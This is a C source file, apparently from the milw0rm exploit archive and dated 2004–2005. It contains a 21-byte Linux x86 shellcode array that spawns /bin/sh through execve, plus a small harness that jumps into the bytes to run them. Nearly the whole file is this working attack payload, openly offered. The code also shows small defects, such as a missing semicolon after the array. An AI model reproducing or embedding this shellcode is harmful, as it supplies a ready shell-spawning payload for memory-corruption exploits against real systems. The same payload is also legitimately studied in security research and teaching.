/*
 lnx_binsh4.c - v1 - 21 Byte /bin/sh Opcode Array Payload
 Copyright(c) 2004 c0ntex <c0ntex@open-security.org>

 This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation; either version 2 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 59 Temple Place, Suite 330, Boston,
 MA  02111-1307  USA
*/

/*
 Calling: execve(/bin/sh)
*/

#include <stdio.h>

typedef char wikkid;

wikkid oPc0d3z[] = "\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

unsigned long grab_esp()
{
		__asm__("
		          xorl %eax,%eax
	  	          movl %eax,%ebx
	  	          movl %esp,%eax
	  	");
}

int main(void)
{
	unsigned long delta;
	void (*pointer)();

	delta = grab_esp();

	fprintf(stderr, "\n[-] Stack Pointer found -> [0x%x]\n", delta);
	fprintf(stderr, "\t[-] Size of payload egg -> [%d]\n", sizeof(oPc0d3z));

	pointer=(void*)&oPc0d3z;

	while(pointer) {
		fprintf(stderr, "\t[-] Payload Begin -> [0x%x]\n", pointer);
		fprintf(stderr, "\t[-] Payload End   -> [0x%x]\n\n", pointer+21);
		pointer();
	}

	_exit(0x01);
}

// milw0rm.com [2005-09-15]